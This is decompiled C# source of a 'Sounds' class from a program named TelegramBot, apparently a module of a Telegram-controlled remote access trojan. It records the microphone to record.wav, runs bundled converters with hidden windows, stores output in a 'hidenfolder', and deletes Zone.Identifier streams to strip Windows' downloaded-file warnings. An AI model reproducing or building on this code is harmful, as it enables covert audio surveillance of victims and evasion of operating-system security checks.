using System;
using System.Diagnostics;
using System.IO;
using System.Media;
using System.Runtime.InteropServices;
using System.Threading;

namespace TelegramBot
{
	// Token: 0x020000E7 RID: 231
	internal class Sounds
	{
		// Token: 0x060002F3 RID: 755
		[DllImport("winmm.dll")]
		private static extern int mciSendString(string MciComando, string MciRetorno, int MciRetornoLeng, int CallBack);

		// Token: 0x060002F4 RID: 756 RVA: 0x00003156 File Offset: 0x00001356
		public static void Start()
		{
			Sounds.mciSendString("open new type waveaudio alias Som", null, 0, 0);
			Sounds.mciSendString("record Som", null, 0, 0);
		}

		// Token: 0x060002F5 RID: 757 RVA: 0x00003174 File Offset: 0x00001374
		public static void Stop()
		{
			Sounds.mciSendString("pause Som", null, 0, 0);
			Sounds.mciSendString("save Som record.wav", null, 0, 0);
			Sounds.mciSendString("close Som", null, 0, 0);
		}

		// Token: 0x060002F6 RID: 758 RVA: 0x00021D3C File Offset: 0x0001FF3C
		public static void Play(string path)
		{
			try
			{
				new Thread(delegate()
				{
					SoundPlayer soundPlayer = new SoundPlayer(path);
					soundPlayer.Load();
					soundPlayer.PlaySync();
					File.Delete(path);
				}).Start();
			}
			catch
			{
			}
		}

		// Token: 0x060002F7 RID: 759 RVA: 0x00021D84 File Offset: 0x0001FF84
		public static void Convert_oga(string path)
		{
			Process process = new Process();
			process.StartInfo.CreateNoWindow = true;
			process.StartInfo.UseShellExecute = false;
			if (Environment.Is64BitOperatingSystem)
			{
				DLLImport.DeleteFileW(Sounds.conv64 + ":Zone.Identifier");
				process.StartInfo.FileName = Sounds.conv64;
				process.StartInfo.Arguments = string.Concat(new string[]
				{
					"-i ",
					path,
					" ",
					Folders.hidenfolder,
					"\\out.wav"
				});
			}
			else
			{
				DLLImport.DeleteFileW(Sounds.conv32 + ":Zone.Identifier");
				process.StartInfo.FileName = Sounds.conv32;
				process.StartInfo.Arguments = string.Concat(new string[]
				{
					"-i ",
					path,
					" ",
					Folders.hidenfolder,
					"\\out.wav"
				});
			}
			process.Start();
			Thread.Sleep(6000);
			Sounds.Play(Folders.hidenfolder + "\\out.wav");
		}

		// Token: 0x060002F8 RID: 760 RVA: 0x00021E9C File Offset: 0x0002009C
		public static void Convert_mp3(string path)
		{
			Process process = new Process();
			process.StartInfo.CreateNoWindow = true;
			process.StartInfo.UseShellExecute = false;
			if (Environment.Is64BitOperatingSystem)
			{
				DLLImport.DeleteFileW(Sounds.conv64 + ":Zone.Identifier");
				process.StartInfo.FileName = Sounds.conv64;
				process.StartInfo.Arguments = string.Concat(new string[]
				{
					"-i ",
					path,
					" -acodec pcm_s16le -ar 16000 ",
					Folders.hidenfolder,
					"\\out.wav"
				});
			}
			else
			{
				DLLImport.DeleteFileW(Sounds.conv32 + ":Zone.Identifier");
				process.StartInfo.FileName = Sounds.conv32;
				process.StartInfo.Arguments = string.Concat(new string[]
				{
					"-i ",
					path,
					" -acodec pcm_s16le -ar 16000 ",
					Folders.hidenfolder,
					"\\out.wav"
				});
			}
			process.Start();
			Thread.Sleep(6000);
			Sounds.Play(Folders.hidenfolder + "\\out.wav");
		}

		// Token: 0x0400051F RID: 1311
		private static string conv32 = "conv32.exe";

		// Token: 0x04000520 RID: 1312
		private static string conv64 = "conv64.exe";
	}
}
